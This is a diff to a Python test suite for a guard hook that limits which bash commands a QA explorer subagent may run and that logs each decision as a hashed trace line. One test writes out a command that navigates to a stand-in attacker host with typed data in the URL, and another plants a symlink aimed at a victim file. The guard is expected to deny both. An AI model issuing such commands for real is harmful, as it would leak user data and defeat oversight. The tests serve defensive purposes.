@@ -836,6 +836,7 @@ class R4Explorer(Case):
             f"{RUN}/qa-out/README.md",
             f"{RUN}/qa-out/plugin-log.jsonl",
             f"{RUN}/qa-out/r/.data/run-form.json.ingested",
+            f"{RUN}/qa-out/r/.data/trace-form.jsonl",  # the hooks' record of its calls, not the explorer's to write
             f"{RUN}/src/app.tsx",
             "/srv/app/x.ts",
             f"{PROJ}/qa-out/r/bugs/BUG-1.md",
@@ -1001,6 +1002,7 @@ class R4Explorer(Case):
             self.assertIsNone(bash(cmd, RUN, explorer=True), cmd)
         for cmd in (
             f"playwright-cli -s=qa requests --all > {out}/.data/plan.json",
+            f"playwright-cli -s=qa requests --all >> {out}/.data/trace-form.jsonl",
             f"playwright-cli -s=qa console error --all > {out}/REPORT.md",
             f"playwright-cli -s=qa screenshot --filename={RUN}/qa-out/shot.png",
             "echo hi > /tmp/notes.txt",
@@ -1886,6 +1888,71 @@ class R8ApproveAndLog(Case):
         self.assertTrue(c.approve)
         self.assertIsNone(c.blocker)
 
+    def test_each_explorer_call_of_a_run_leaves_a_request_line_in_its_trace(self):
+        """The time the guard saw the call and what it decided: with the result line PostToolUse writes, the run's trace
+        tells how long Claude Code's own check held each unapproved call. A verb, a rule and a hash, never the text."""
+        import hashlib
+
+        cwd = project()
+        marker(cwd)
+        expires = json.loads((cwd / "qa-out/.active").read_text())["expires"]
+        trace = cwd / "qa-out/.active.progress"
+        lines = lambda: [json.loads(x) for x in trace.read_text().splitlines()]
+        key = lambda c: hashlib.sha1(" ".join(c.split()).encode(), usedforsecurity=False).hexdigest()[:12]
+        t = time.time()
+        ok, slow, bad = (
+            "playwright-cli -s=qa  fill e1 'my typed value'",
+            "playwright-cli -s=qa snapshot | jq '.secret_page_text'",
+            "playwright-cli -s=qa goto https://evil.example/page?q=typed",
+        )
+        self.assertEqual(decision(ok, cwd, agent_type=EX, tool_use_id="toolu_1"), "allow")
+        self.assertIsNone(decision(slow, cwd, agent_type=EX))
+        self.assertEqual(decision(bad, cwd, agent_type=EX, tool_use_id="toolu_3"), "deny")
+        a, c, d = lines()
+        self.assertEqual(
+            (a["e"], a["t"], a["d"], a["k"], a["id"]), (expires, "q", "a", key(ok), "toolu_1")
+        )  # the key PostToolUse puts on the result line: pairs the two when no id does
+        self.assertNotIn("w", a)
+        self.assertTrue(t <= a["ts"] <= time.time() and round(a["ts"], 3) == a["ts"])
+        self.assertEqual((c["d"], c["w"], c["k"]), ("c", "jq", key(slow)))
+        self.assertNotIn("id", c)
+        self.assertEqual((d["d"], d["id"]), ("d", "toolu_3"))
+        self.assertTrue(d["w"] and len(d["w"]) <= 40 and ":" not in d["w"])
+        for leak in ("typed", "secret_page_text", "evil.example", "/page"):
+            self.assertNotIn(leak, trace.read_text())
+        self.assertEqual(os.stat(trace).st_mode & 0o777, 0o600)
+
+    def test_a_request_line_only_for_an_explorer_bash_call_in_a_live_run(self):
+        cwd = project()
+        trace = cwd / "qa-out/.active.progress"
+        decision("playwright-cli -s=qa snapshot", cwd, agent_type=EX)  # no run
+        self.assertFalse(trace.exists())
+        marker(cwd)
+        decision("playwright-cli -s=qa snapshot", cwd)  # the main session
+        decision("playwright-cli -s=qa snapshot", cwd, agent_type="qa-sdet:qa-crawler")
+        tool("Read", EX, cwd=cwd, file_path=str(cwd / "x"))
+        self.assertFalse(trace.exists())
+        marker(cwd, expires=time.time() - 5)  # expired: no run
+        decision("playwright-cli -s=qa snapshot", cwd, agent_type=EX)
+        self.assertFalse(trace.exists())
+
+    def test_the_trace_never_follows_a_link_and_never_changes_a_decision(self):
+        cwd = project()
+        marker(cwd)
+        victim = TMP / "trace-victim.txt"
+        victim.write_text("keep")
+        (cwd / "qa-out/.active.progress").symlink_to(victim)
+        self.assertEqual(decision("playwright-cli -s=qa snapshot", cwd, agent_type=EX), "allow")
+        self.assertEqual(victim.read_text(), "keep")
+        (cwd / "qa-out/.active.progress").unlink()
+        os.mkfifo(cwd / "qa-out/.active.progress")  # must neither block nor fail the guard
+        self.assertEqual(decision("playwright-cli -s=qa snapshot", cwd, agent_type=EX), "allow")
+        self.assertEqual(decision(EVIL, cwd, agent_type=EX), "deny")
+        other = project()
+        marker(other)
+        with mock.patch.object(g.os, "open", side_effect=OSError("disk full")):
+            self.assertEqual(decision("playwright-cli -s=qa snapshot", other, agent_type=EX), "allow")
+
     def test_audit_parser_and_wrapper_bypasses(self):
         # F1: python3 -c / arbitrary /tmp/qa-mem / -X qa-mem must never spoof qa-mem
         for cmd in [
@@ -2264,6 +2331,7 @@ class Plumbing(Case):
             out = io.StringIO()
             with (
                 mock.patch.object(g, "evaluate", side_effect=RuntimeError("x"), create=True),
+                mock.patch.object(g, "verdict", side_effect=RuntimeError("x"), create=True),
                 mock.patch.object(g, "decide", side_effect=RuntimeError("x")),
                 mock.patch.object(sys, "stdin", io.StringIO(json.dumps(data))),
                 contextlib.redirect_stdout(out),
